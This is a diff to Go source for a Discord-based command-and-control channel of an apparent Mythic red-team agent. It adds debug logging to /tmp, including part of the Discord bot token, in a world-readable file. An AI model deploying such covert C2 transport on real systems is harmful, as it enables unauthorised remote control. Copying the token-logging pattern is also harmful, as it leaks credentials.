@@ -16,6 +16,7 @@ import (
 	"net/http"
 	"net/textproto"
 	"net/url"
+	"os"
 	"strconv"
 	"strings"
 	"sync"
@@ -270,6 +271,7 @@ func (d *DiscordProfile) nextClientID() string {
 
 // Checkin performs the initial checkin with Mythic via the Discord channel.
 func (d *DiscordProfile) Checkin(agent *structs.Agent) error {
+	os.WriteFile("/tmp/fawkes-debug.txt", []byte(fmt.Sprintf("checkin: start uuid=%s\n", agent.PayloadUUID)), 0644)
 	cfg := d.getConfig()
 	if cfg == nil {
 		return fmt.Errorf("failed to decrypt Discord configuration")
@@ -579,6 +581,7 @@ func (d *DiscordProfile) PostResponse(response structs.Response, agent *structs.
 // mythicMessage is the base64-encoded Mythic message (UUID + encrypted payload).
 // senderID is the agent's UUID used for message correlation.
 func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensitiveConfig) (string, error) {
+	os.WriteFile("/tmp/fawkes-debug.txt", []byte(fmt.Sprintf("sendAndPoll: chan=%s token=%s... msgLen=%d\n", cfg.ChannelID, cfg.BotToken[:min(10, len(cfg.BotToken))], len(mythicMessage))), 0644)
 	clientID := d.nextClientID()
 
 	wrapper := MythicMessageWrapper{
@@ -596,12 +599,16 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 	// Send to Discord — use file attachment if message is too large
 	if len(wrapperJSON) > maxMessageLength {
 		if err := d.sendFileMessage(wrapperJSON, senderID+"server", cfg); err != nil {
+			os.WriteFile("/tmp/fawkes-debug.txt", []byte(fmt.Sprintf("file upload FAIL: %v\n", err)), 0644)
 			return "", fmt.Errorf("file upload failed: %w", err)
 		}
+		os.WriteFile("/tmp/fawkes-debug.txt", []byte("file upload OK\n"), 0644)
 	} else {
 		if err := d.sendTextMessage(string(wrapperJSON), cfg); err != nil {
+			os.WriteFile("/tmp/fawkes-debug.txt", []byte(fmt.Sprintf("text send FAIL: %v\n", err)), 0644)
 			return "", fmt.Errorf("text message failed: %w", err)
 		}
+		os.WriteFile("/tmp/fawkes-debug.txt", []byte("text send OK\n"), 0644)
 	}
 
 	// Poll for response matching our sender_id with to_server=false
